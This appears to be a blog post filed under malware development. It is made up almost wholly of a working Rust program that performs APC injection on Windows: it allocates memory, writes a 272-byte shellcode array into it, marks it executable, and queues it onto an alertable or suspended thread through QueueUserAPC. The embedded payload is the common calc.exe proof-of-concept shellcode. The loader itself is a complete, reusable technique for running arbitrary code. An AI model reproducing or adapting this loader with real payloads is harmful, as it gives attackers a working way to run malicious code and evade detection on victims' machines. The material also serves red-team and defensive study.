---
title: "APC-Injection"
date: 2026-07-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# APC-Injection


## main.rs

```rust
use std::{
    io::{self, Write},
    ptr::{null_mut, copy_nonoverlapping},
    mem::transmute,
};
use rand::Rng;
use winapi::{
    ctypes::c_void,
    shared::minwindef::FALSE,
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        memoryapi::{VirtualAlloc, VirtualProtect},
        processthreadsapi::{CreateThread, QueueUserAPC, ResumeThread},
        synchapi::{CreateEventW, SignalObjectAndWait, WaitForSingleObject},
        winbase::CREATE_SUSPENDED,
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
    },
};

/// Toggle between two APC injection techniques:
/// - `true`:  Create thread in alertable state (recommended, cleaner)
/// - `false`: Create suspended thread + ResumeThread
const ALERTSTATE: bool = true;

// calc.exe - Standard x64 Windows shellcode (position-independent)
static SHELLCODE: [u8; 272] = [
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
];

// Dummy function used when creating a suspended thread.
unsafe extern "system" fn dum_fn(_param: *mut c_void) -> u32 {
    #[allow(deprecated)]
    let a = rand::thread_rng().r#gen::<i32>(); // r#gen because `gen` is a reserved keyword in recent Rust
    #[allow(deprecated)]
    let _b = a + rand::thread_rng().r#gen::<i32>();
    0
}

// Creates an alertable thread using events + SignalObjectAndWait.  This is the preferred method for APC injection because the thread can immediately receive APCs without needing ResumeThread.
unsafe extern "system" fn alterable_fn(_param: *mut c_void) -> u32 {
    unsafe {
        let h_event1 = CreateEventW(null_mut(), FALSE, FALSE, null_mut());
        let h_event2 = CreateEventW(null_mut(), FALSE, FALSE, null_mut());

        if !h_event1.is_null() && !h_event2.is_null() {
            // The 4th parameter (1) makes the wait alertable
            SignalObjectAndWait(h_event1, h_event2, 0xFFFFFFFF, 1);
            CloseHandle(h_event1);
            CloseHandle(h_event2);
        }
    }
    0
}

// APC Injection
unsafe fn apc_injection(h_thread: *mut c_void, shellcode: &[u8]) -> bool {
    let shellcode_size = shellcode.len();

    unsafe {
        // Allocate memory (initially PAGE_READWRITE)
        let shellcode_addr = VirtualAlloc(
            null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if shellcode_addr.is_null() {
            eprintln!("[VirtualAlloc] Failed: {}", GetLastError());
            return false;
        }

        // Copy shellcode into allocated region
        copy_nonoverlapping(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode_size);

        // Make memory executable
        let mut oldprotect = 0u32;
        if VirtualProtect(
            shellcode_addr,
            shellcode_size,
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        ) == 0
        {
            eprintln!("[VirtualProtect] Failed: {}", GetLastError());
            return false;
        }

        println!("[+] Press <Enter> To Execute Shellcode!");
        let _ = io::stdout().flush();
        let _ = io::stdin().read_line(&mut String::new());

        // Queue the APC - this is the actual injection
        if QueueUserAPC(Some(transmute(shellcode_addr)), h_thread, 0) == 0 {
            eprintln!("[QueueUserAPC] Failed: {}", GetLastError());
            return false;
        }
    }

    true
}

fn main() {
    println!("[+] Press <Enter> To Start APC Injection!");
    let _ = io::stdout().flush();
    let _ = io::stdin().read_line(&mut String::new());

    let mut thread_id = 0u32;
    let mut h_thread: *mut c_void = null_mut();

    // Create the target thread (alertable or suspended)
    unsafe {
        if ALERTSTATE {
            h_thread = CreateThread(
                null_mut(),
                0,
                Some(alterable_fn),
                null_mut(),
                0,
                &mut thread_id,
            );
            println!("[+] Thread created in alertable state | ID: {}", thread_id);
        } else {
            h_thread = CreateThread(
                null_mut(),
                0,
                Some(dum_fn),
                null_mut(),
                CREATE_SUSPENDED,
                &mut thread_id,
            );
            println!("[+] Thread created suspended | ID: {}", thread_id);
        }

        if h_thread.is_null() {
            eprintln!("[CreateThread] Failed: {}", GetLastError());
            return;
        }
    }

    // Perform the APC injection
    unsafe {
        if !apc_injection(h_thread, &SHELLCODE) {
            CloseHandle(h_thread);
            return;
        }
    }

    // Resume thread only if we created it suspended
    if !ALERTSTATE {
        unsafe { ResumeThread(h_thread); }
        println!("[+] Thread resumed");
    }

    println!("[+] Waiting for shellcode execution to complete...");
    unsafe {
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }

    println!("[#] Press <Enter> To Quit...");
    let _ = io::stdout().flush();
    let _ = io::stdin().read_line(&mut String::new());

    unsafe { CloseHandle(h_thread); }
}
```

